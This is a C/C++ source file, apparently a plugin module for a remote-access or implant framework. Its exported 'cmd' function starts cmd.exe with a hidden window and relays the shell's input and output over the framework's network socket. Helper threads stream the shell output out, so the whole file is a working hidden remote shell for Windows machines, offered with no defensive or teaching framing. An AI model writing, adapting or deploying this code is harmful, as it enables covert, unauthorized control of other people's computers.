// This file was created by the dropin manager
// You still need to add the meat to your function

#include "../core/external.h"

#define SIZE 4096

typedef struct {
    HANDLE fHand;
    char *buf;
} hand_buf;

void helper(hand_buf *arg)
{
    DWORD num;
    for(;;){
        ReadFile(arg->fHand, arg->buf, SIZE, &num, NULL);
        send(DllMeta.net.sock, arg->buf, num, 0);
    }
}

extern "C" __declspec(dllexport) void cmd(const char *arg)
{
    SECURITY_ATTRIBUTES attr;
    
    attr.nLength = sizeof(SECURITY_ATTRIBUTES);
    attr.lpSecurityDescriptor = NULL;
    attr.bInheritHandle = TRUE;   

    HANDLE rStdOut, rStdErr, rStdIn;

    char out_buf[SIZE];
    char err_buf[SIZE];
    char in_buf[SIZE];
    
    STARTUPINFO info;    
    
    ZeroMemory(&info, sizeof(STARTUPINFO));
    info.cb = sizeof(STARTUPINFO);
    
    CreatePipe(&rStdOut, &info.hStdOutput, &attr, SIZE);
    CreatePipe(&rStdErr, &info.hStdError, &attr, SIZE);
    CreatePipe(&info.hStdInput, &rStdIn, &attr, SIZE);
    
    info.dwFlags = STARTF_USESTDHANDLES | STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
    info.wShowWindow = SW_HIDE;
    
    
    PROCESS_INFORMATION proc_info;
    
    char name[] = "C:\\Windows\\system32\\cmd.exe";
    
    CreateProcess(NULL,
                  name,
                  NULL,
                  NULL,
                  TRUE,
                  0,
                  NULL,
                  NULL,
                  &info,
                  &proc_info
                  );
                  
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);

    OVERLAPPED over;
    DWORD num;

    hand_buf out = { rStdOut, out_buf };
    hand_buf err = { rStdErr, err_buf };

    HANDLE helpA = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &out, 0, NULL);
    HANDLE helpB = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &err, 0, NULL);
    
    for(;;){
        num = recv(DllMeta.net.sock, in_buf, SIZE, 0);
        WriteFile(rStdIn, in_buf, num, NULL, NULL);
        if(strstr(in_buf, "exit")) break;
    }
    
    TerminateThread(helpA, 0);
    TerminateThread(helpB, 0);
    
    CloseHandle(rStdOut);
    CloseHandle(rStdErr);
    CloseHandle(rStdIn);
    CloseHandle(info.hStdOutput);
    CloseHandle(info.hStdInput);
    CloseHandle(info.hStdError);
}
